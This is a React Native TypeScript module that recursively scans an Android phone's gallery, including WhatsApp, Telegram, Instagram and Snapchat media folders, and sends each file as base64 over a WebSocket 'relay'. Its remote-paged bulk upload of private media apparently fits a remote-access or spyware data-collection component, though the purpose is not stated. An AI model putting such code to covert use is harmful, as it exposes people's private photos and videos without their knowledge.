/**
 * FileManager.ts
 * - Searches the whole gallery (photos + videos)
 * - Supports offset/count for pagination
 * - Uploads via relay (base64 JSON) instead of HTTP multipart
 */

import { PermissionsAndroid, Platform } from 'react-native';
import RNFS from 'react-native-fs';

export interface MediaFile {
  name: string;
  path: string;
  mtime: Date;
  size: number;
  type: 'photo' | 'video';
}

// ─── Permissions ─────────────────────────────────────────────────────────────

export async function requestStoragePermission(): Promise<boolean> {
  if (Platform.OS !== 'android') return true;

  try {
    const sdkVersion = parseInt(Platform.Version as string, 10);

    if (sdkVersion >= 33) {
      const results = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      ]);
      return (
        results[PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES] === PermissionsAndroid.RESULTS.GRANTED &&
        results[PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO] === PermissionsAndroid.RESULTS.GRANTED
      );
    } else {
      const result = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      );
      return result === PermissionsAndroid.RESULTS.GRANTED;
    }
  } catch {
    return false;
  }
}

// ─── Extensions ──────────────────────────────────────────────────────────────

const PHOTO_EXTENSIONS = ['.png', '.jpg', '.jpeg', '.webp', '.heic', '.gif'];
const VIDEO_EXTENSIONS = ['.mp4', '.mkv', '.avi', '.mov', '.3gp', '.webm', '.ts'];

function isPhoto(name: string): boolean {
  return PHOTO_EXTENSIONS.some(ext => name.toLowerCase().endsWith(ext));
}

function isVideo(name: string): boolean {
  return VIDEO_EXTENSIONS.some(ext => name.toLowerCase().endsWith(ext));
}

// ─── Gallery Search ───────────────────────────────────────────────────────────

const MEDIA_DIRS = [
  RNFS.ExternalStorageDirectoryPath + '/DCIM',
  RNFS.ExternalStorageDirectoryPath + '/Pictures',
  RNFS.ExternalStorageDirectoryPath + '/Movies',
  RNFS.ExternalStorageDirectoryPath + '/Videos',
  RNFS.ExternalStorageDirectoryPath + '/Download',
  RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Images',
  RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Video',
  RNFS.ExternalStorageDirectoryPath + '/Telegram',
  RNFS.ExternalStorageDirectoryPath + '/Instagram',
  RNFS.ExternalStorageDirectoryPath + '/Snapchat',
];

async function scanDir(dir: string, mediaType: 'photo' | 'video' | 'both'): Promise<MediaFile[]> {
  const results: MediaFile[] = [];
  try {
    const exists = await RNFS.exists(dir);
    if (!exists) return results;

    const items = await RNFS.readDir(dir);

    for (const item of items) {
      if (item.isFile()) {
        const isP = isPhoto(item.name);
        const isV = isVideo(item.name);
        const include =
          (mediaType === 'photo' && isP) ||
          (mediaType === 'video' && isV) ||
          (mediaType === 'both' && (isP || isV));

        if (include) {
          results.push({
            name: item.name,
            path: item.path,
            mtime: item.mtime ?? new Date(0),
            size: item.size,
            type: isV ? 'video' : 'photo',
          });
        }
      } else if (item.isDirectory()) {
        const sub = await scanDir(item.path, mediaType);
        results.push(...sub);
      }
    }
  } catch {
    // Not accessible, skip
  }
  return results;
}

export async function getMedia(
  mediaType: 'photo' | 'video' | 'both',
  count: number,
  offset: number = 0,
): Promise<MediaFile[]> {
  let allFiles: MediaFile[] = [];

  for (const dir of MEDIA_DIRS) {
    const found = await scanDir(dir, mediaType);
    allFiles = allFiles.concat(found);
  }

  // Deduplicate by path
  const seen = new Set<string>();
  allFiles = allFiles.filter(f => {
    if (seen.has(f.path)) return false;
    seen.add(f.path);
    return true;
  });

  // Newest first
  allFiles.sort((a, b) => b.mtime.getTime() - a.mtime.getTime());

  return allFiles.slice(offset, offset + count);
}

// ─── Upload via Relay ─────────────────────────────────────────────────────────

/**
 * Reads the file and sends it as a base64-encoded JSON message via the relay.
 * The `sendFn` is the relay's WebSocket send function.
 */
export async function uploadFileViaRelay(
  file: MediaFile,
  sendFn: (data: object) => void,
): Promise<void> {
  // Read file as base64
  const base64Data = await RNFS.readFile(file.path, 'base64');

  sendFn({
    event: 'file',
    name: file.name,
    type: file.type,
    size: file.size,
    data: base64Data,
  });

  // Small delay between files to avoid flooding the relay
  await new Promise(resolve => setTimeout(resolve, 200));
}
